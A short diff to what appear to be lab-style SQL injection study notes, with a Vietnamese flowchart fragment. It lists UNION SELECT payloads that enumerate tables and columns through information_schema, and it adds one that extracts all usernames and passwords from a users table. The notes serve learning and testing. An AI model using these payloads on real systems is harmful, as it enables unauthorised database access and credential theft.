@@ -90,6 +90,8 @@ Listing the contents of the database
 to list the tables in the database: ' UNION SELECT * FROM information_schema.tables / ' UNION SELECT table_name, NULL FROM information_schema.tables--
 to list the columns in individual tables: ' UNION SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
+to retrieve the usernames and passwords for all users:
+' UNION SELECT+username_abcdef, password_abcdef FROM users_abcdef--
 graph TD
     A[Bắt đầu] --> B{Có biết tên bảng?};
     B -->|Không| C[Dùng information_schema.tables];
